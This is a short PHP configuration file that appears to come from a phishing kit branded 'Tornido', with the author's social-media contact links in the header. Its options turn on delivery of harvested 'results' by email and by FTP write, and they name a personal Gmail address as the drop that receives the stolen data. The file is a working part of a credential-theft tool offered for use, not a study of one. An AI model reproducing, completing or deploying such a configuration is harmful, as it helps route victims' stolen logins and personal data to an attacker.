<?php

# Don't touch !
################# Tornido : Edited By D.Dixon ########################
################ # # # # # # # # # # # # # #  ########################
################ Any problems contact me Here : ###################### 
################ # # # # # # # # # # # # # # #  ######################
### Profil : https://www.facebook.com/No.Love.No.Woman.No.Problems ###
##### Group : https://www.facebook.com/groups/YaSser127.0.0.1/ #######
############## # # # # # # # # # # # # # #  # # # # # # ##############
##################       Good Luck       #############################
############## # # # # # # # # # # # # # # # # # #####################
################# Tornido : Edited By D.Dixon ########################


/*

 */




/*
Option Send Email :
1 : Send Email.
0 : Don't Send Email.
Option Ftp Write
1 : FTP Write.
0 : Don't FTP Save Result.
*/
$Send_Email = 1;
$Ftp_Write = 1;
//   <============================= Your Email =============================>
$to      = 'ander0665@gmail.com';
//   <============================= Your Email =============================>



?>